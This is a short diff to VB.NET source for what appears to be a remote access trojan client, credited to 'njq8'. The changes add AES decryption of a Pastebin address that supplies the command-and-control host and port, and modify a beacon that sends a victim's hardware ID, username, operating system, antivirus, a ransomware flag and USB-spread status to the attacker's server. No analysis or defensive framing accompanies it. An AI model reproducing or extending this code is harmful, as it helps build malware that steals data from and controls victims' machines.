@@ -1,7 +1,7 @@
 ﻿
 Public Class C_Socket
     'credit to njq8
-    Public Shared KEY As String = Convert.ToBase64String(SB(C_Settings.KEY))
+    Public Shared KEY As String = C_Settings.KEY
     Public Shared SPL As String = C_Settings.SPL
     Public Shared C As Net.Sockets.TcpClient
     Public Shared R As New Random
@@ -88,7 +88,7 @@ e:      ' clear things and ReConnect
 
             Try
                 Dim WC As Net.WebClient = New Net.WebClient() 'Pastebin, split by ":" IP:PORT
-                Dim reply As String = WC.DownloadString(C_Settings.Pastebin)
+                Dim reply As String = WC.DownloadString(C_Encryption.AES_Decrypt(C_Settings.Pastebin))
                 C_Settings.HOST = reply.Split(":")(0)
                 C_Settings.PORT = reply.Split(":")(1)
                 WC.Dispose()
@@ -98,7 +98,7 @@ e:      ' clear things and ReConnect
             C.Client.Connect(C_Settings.HOST, C_Settings.PORT)
             CNT = True
             'Send info to server
-            Send("info" & SPL & C_ID.HWID & SPL & C_ID.UserName & SPL & IO.Path.GetFileName(Application.ExecutablePath) & SPL & "v0.5.8" & SPL & C_ID.MyOS & " " & C_ID.Bit & SPL & C_ID.INDATE & SPL & C_ID.AV & SPL & C_ID.Ransomeware & SPL & C_ID.USBSP & SPL & " ")
+            Send("info" & SPL & C_ID.HWID & SPL & C_ID.UserName & SPL & IO.Path.GetFileName(Application.ExecutablePath) & SPL & "v0.5.8B" & SPL & C_ID.MyOS & " " & C_ID.Bit & SPL & C_ID.INDATE & SPL & C_ID.AV & SPL & C_ID.Rans & SPL & C_ID.USBSP & SPL & " ")
         Catch ex As Exception
             Threading.Thread.CurrentThread.Sleep(R.Next(5000))
             GoTo e
